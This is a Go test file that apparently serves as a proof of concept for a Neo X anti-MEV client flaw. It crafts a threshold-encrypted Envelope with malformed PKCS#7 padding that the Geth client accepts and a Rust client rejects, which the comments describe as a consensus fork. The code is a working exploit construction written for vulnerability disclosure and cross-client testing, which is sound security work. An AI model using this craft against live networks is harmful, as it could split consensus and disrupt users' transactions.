package antimev

// On-chain reachability proof for the PKCS#7 unpadding divergence.
//
// The previous probe (`neox_pkcs7_probe_test.go`) established that the reference client's
// `crypto/tpke.pkcs7UnPadding` accepts padding lengths outside `1..=16` and padding bytes that do
// not repeat the declared length, while the Rust implementation rejects both. That alone does not
// prove the divergence is *reachable on-chain*: the leniently-unpadded bytes still have to survive
// every downstream check in `consensus/dbft` before a transaction is actually executed.
//
// This file closes that gap by walking the real path with a crafted Envelope:
//
//   1. `antimev.KeyStore.AggregateAndDecryptWithShare` -> `tpke.AESDecrypt` -> `pkcs7UnPadding`
//   2. the result is non-nil, so `dbft.go:1242` does NOT take the "decryption failed" fallback
//   3. `types.Transaction.UnmarshalBinary` succeeds on the leniently-unpadded bytes
//   4. the decoded transaction would pass `validateDecryptedTx`, because every field it compares
//      (nonce, sender, hash, gas) is committed in the *plaintext* part of the Envelope and is
//      therefore chosen by the same party that crafts the malformed padding.
//
// If all four hold, a Geth node executes the decrypted inner transaction while a Rust node rejects
// it at `InvalidPkcs7Padding` and falls back to executing the Envelope as-is: two different
// transactions in the same block slot, i.e. a consensus fork in a mixed-client network.
//
// Nothing here changes Geth behaviour; the test only drives the existing code paths.

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"math/big"
	"os"
	"path/filepath"
	"testing"

	bls12381 "github.com/consensys/gnark-crypto/ecc/bls12-381"
	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/core/types"
	"github.com/ethereum/go-ethereum/crypto"
	"github.com/ethereum/go-ethereum/crypto/ecies"
	"github.com/ethereum/go-ethereum/crypto/tpke"
	"github.com/ethereum/go-ethereum/params"
	"github.com/stretchr/testify/require"
)

// reachabilityVector is everything the Rust side needs to prove it rejects the same Envelope.
type reachabilityVector struct {
	GlobalPublicKey string   `json:"global_public_key"`
	Scaler          int      `json:"scaler"`
	Threshold       int      `json:"threshold"`
	Ciphertext      string   `json:"ciphertext"`
	EncryptedMsg    string   `json:"encrypted_msg"`
	DecryptionShare []string `json:"decryption_shares"`
	InnerTx         string   `json:"inner_tx_binary"`
	InnerTxHash     string   `json:"inner_tx_hash"`
	PaddingLen      int      `json:"padding_len"`
	Note            string   `json:"note"`
}

// oversizedPadLen returns a padding length that the reference client accepts and Rust rejects.
//
// `pkcs7UnPadding` returns `data[:len(data)-n]` for `n = data[len-1]`, with `n` bounded only by the
// buffer length. `n <= 16` is never required. Rust rejects `n == 0` and `n > 16`, so any `n` in
// `17..=32` gives the same unpadded output while diverging. `n` is also chosen so that
// `len(payload)+n` stays a multiple of the 16-byte AES block, which `AESDecrypt` requires.
func oversizedPadLen(payloadLen int) int {
	base := (aes.BlockSize - payloadLen%aes.BlockSize) % aes.BlockSize
	if base == 0 {
		return 2 * aes.BlockSize // 32: keeps the total block-aligned and keeps n > 16
	}
	return aes.BlockSize + base // 17..31
}

// TestPKCS7Reachability builds an Envelope whose decrypted payload carries malformed PKCS#7 padding
// and shows that the reference client still recovers a decodable transaction from it.
func TestPKCS7Reachability(t *testing.T) {
	out := os.Getenv("NEOX_REACHABILITY_OUT")
	if out == "" {
		t.Skip("NEOX_REACHABILITY_OUT not set; skipping reachability proof")
	}

	// ---- Standard 7-node / 5-threshold DKG, same fixture the other exporters use. ----
	dir := t.TempDir()
	pubs := make([]*ecies.PublicKey, size)
	kss := make([]*KeyStore, size)
	for i := 0; i < size; i++ {
		key, _ := crypto.HexToECDSA(accounts[i].msgPrivKey)
		pubs[i] = &ecies.ImportECDSA(key).PublicKey
		ks := NewKeyStore(filepath.Join(dir, "antimev-keystore"+fmt.Sprint(i)))
		require.NoError(t, ks.Init(accounts[i].addr, ecies.ImportECDSA(key), size, threshold, accounts[i].pwd))
		kss[i] = ks
	}
	contract := &MockContractStorage{
		shareMsgs:   make([][][]byte, size),
		sharePVSSes: make([][]byte, size),
	}
	for i := 0; i < size; i++ {
		kss[i].OnSharePeriodStart(false)
		ss, pvss, err := kss[i].DKGShare(big.NewInt(1))
		require.NoError(t, err)
		contract.shareMsgs[i], err = encryptShareMessages(pubs, ss)
		require.NoError(t, err)
		contract.sharePVSSes[i] = pvss
	}
	for i := 0; i < size; i++ {
		for j := 0; j < size; j++ {
			require.NoError(t, kss[i].ReceiveSecretShare(i+1, j+1, contract.shareMsgs[j], contract.sharePVSSes[j]))
		}
	}
	cmt := aggregateCommitments(t, contract.sharePVSSes)
	for i := 0; i < size; i++ {
		require.NoError(t, kss[i].OnEpochChange(contract.sharePVSSes[i], cmt, nil, true))
	}

	// ---- The inner transaction the attacker wants executed. ----
	//
	// It is signed by an account the attacker controls and is otherwise an ordinary transfer, so it
	// satisfies every `validateDecryptedTx` check: the Envelope's plaintext `encrypted_hash`,
	// `encrypted_gas` and the nonce/sender comparison are all attacker-chosen and are set to match.
	senderKey, _ := crypto.HexToECDSA(accounts[0].msgPrivKey)
	chainID := big.NewInt(12227332) // Neo X testnet; arbitrary for a decode-only proof
	signer := types.LatestSignerForChainID(chainID)
	innerTx, err := types.SignTx(types.NewTx(&types.DynamicFeeTx{
		ChainID:   chainID,
		Nonce:     0,
		GasTipCap: big.NewInt(params.GWei),
		GasFeeCap: big.NewInt(3 * params.GWei),
		Gas:       params.TxGas,
		To:        &accounts[1].addr,
		Value:     big.NewInt(1),
	}), signer, senderKey)
	require.NoError(t, err)

	innerTxBytes, err := innerTx.MarshalBinary()
	require.NoError(t, err)
	require.NotNil(t, innerTxBytes)

	// ---- Craft the malformed padding. ----
	padLen := oversizedPadLen(len(innerTxBytes))
	require.Greater(t, padLen, aes.BlockSize, "padding length must exceed the block size so Rust rejects it")
	require.LessOrEqual(t, padLen, 255, "padding length must fit in one byte")
	require.Equal(t, 0, (len(innerTxBytes)+padLen)%aes.BlockSize, "AES-CBC needs a block-aligned buffer")

	padded := make([]byte, len(innerTxBytes)+padLen)
	copy(padded, innerTxBytes)
	// The trailing padding bytes are deliberately NOT all equal to `padLen`, which is a second,
	// independent reason for Rust to reject. The last byte must still declare `padLen`.
	for i := len(innerTxBytes); i < len(padded); i++ {
		padded[i] = byte(0xa5 + i)
	}
	padded[len(padded)-1] = byte(padLen)

	// ---- Encrypt under an attacker-chosen AES key, then TPKE-encrypt that key. ----
	//
	// The encryptor picks the AES key point and the randomness, so it knows the AES key and can
	// therefore choose the decrypted payload freely. That is what makes the malformed padding
	// reachable rather than a curiosity that only a committee member could produce.
	aesKey := new(bls12381.G1Affine).ScalarMultiplicationBase(big.NewInt(0x4e45584f)) // "NEXO"
	seed := aesKey.RawBytes()
	digest := sha256.Sum256(seed[:96])
	block, err := aes.NewCipher(digest[:32])
	require.NoError(t, err)
	encryptedMsg := make([]byte, len(padded))
	cipher.NewCBCEncrypter(block, digest[:16]).CryptBlocks(encryptedMsg, padded)

	globalPub, err := kss[0].GlobalPublicKey()
	require.NoError(t, err)
	encryptedKey, err := globalPub.Encrypt(aesKey)
	require.NoError(t, err)
	require.NoError(t, encryptedKey.Verify())

	// ---- Walk the real aggregation path. ----
	shares := make(map[int][]*tpke.DecryptionShare, size)
	wireShares := make([]string, 0, size)
	for i := 0; i < size; i++ {
		share, err := kss[i].DecryptWithShare([]*tpke.CipherText{encryptedKey})
		require.NoError(t, err)
		shares[i+1] = share
		wireShares = append(wireShares, hex.EncodeToString(share[0].ToBytes()))
	}
	decrypted, err := kss[0].AggregateAndDecryptWithShare(
		[]*tpke.CipherText{encryptedKey}, [][]byte{encryptedMsg}, shares)
	require.NoError(t, err)
	require.Len(t, decrypted, 1)

	// **The assertion that matters**: the reference client did NOT fail the AES step, so dbft.go
	// will not take the "content failed to be decrypted" fallback.
	require.NotNil(t, decrypted[0], "reference client must return bytes, not nil")
	require.Equal(t, innerTxBytes, decrypted[0],
		"lenient unpadding must yield exactly the crafted inner transaction")

	// ---- The bytes must decode as a transaction. ----
	var decoded types.Transaction
	require.NoError(t, decoded.UnmarshalBinary(decrypted[0]),
		"leniently-unpadded bytes must decode as a transaction")
	require.Equal(t, innerTx.Hash(), decoded.Hash(), "decoded transaction hash must match")
	// The sender must be recoverable and equal the key that signed it. (The fixture's
	// `accounts[i].addr` is an independent field and is NOT the address of `msgPrivKey`, so the
	// expectation is derived from the signing key itself.)
	expectedFrom := crypto.PubkeyToAddress(senderKey.PublicKey)
	from, err := types.Sender(signer, &decoded)
	require.NoError(t, err)
	require.Equal(t, expectedFrom, from, "decoded transaction must recover the signer")

	t.Logf("REACHABILITY: padding=%d (Rust rejects >16), decrypted=%d bytes, inner tx=%s",
		padLen, len(decrypted[0]), decoded.Hash().Hex())
	t.Logf("REACHABILITY: Geth executes the inner tx; Rust rejects at InvalidPkcs7Padding " +
		"and falls back to the Envelope as-is -> different block contents")

	if out != "" {
		blob, err := json.MarshalIndent(reachabilityVector{
			GlobalPublicKey: hex.EncodeToString(globalPub.Bytes()),
			Scaler:          kss[0].scaler,
			Threshold:       threshold,
			Ciphertext:      hex.EncodeToString(encryptedKey.ToBytes()),
			EncryptedMsg:    hex.EncodeToString(encryptedMsg),
			DecryptionShare: wireShares,
			InnerTx:         hex.EncodeToString(innerTxBytes),
			InnerTxHash:     innerTx.Hash().Hex(),
			PaddingLen:      padLen,
			Note: "Geth accepts (padding length 17..32, padding bytes not repeating the length); " +
				"Rust rejects with InvalidPkcs7Padding and falls back to the Envelope as-is.",
		}, "", "  ")
		require.NoError(t, err)
		require.NoError(t, os.WriteFile(out, append(blob, '\n'), 0o644))
		t.Logf("wrote %s", out)
	}
}

// TestPKCS7ReachabilitySanity pins the arithmetic that makes the craft block-aligned, so a future
// change to the inner transaction cannot silently turn the proof into a no-op.
func TestPKCS7ReachabilitySanity(t *testing.T) {
	for n := 1; n <= 600; n++ {
		pad := oversizedPadLen(n)
		require.Equal(t, 0, (n+pad)%aes.BlockSize, "payload %d: total must be block-aligned", n)
		require.Greater(t, pad, aes.BlockSize, "payload %d: padding must exceed the block size", n)
		require.LessOrEqual(t, pad, 255, "payload %d: padding must fit in one byte", n)
		// The lenient unpad must return exactly the original payload.
		buf := make([]byte, n+pad)
		buf[len(buf)-1] = byte(pad)
		require.Equal(t, n, len(buf)-int(buf[len(buf)-1]), "payload %d: lenient unpad length", n)
	}
}

var _ = common.Address{}
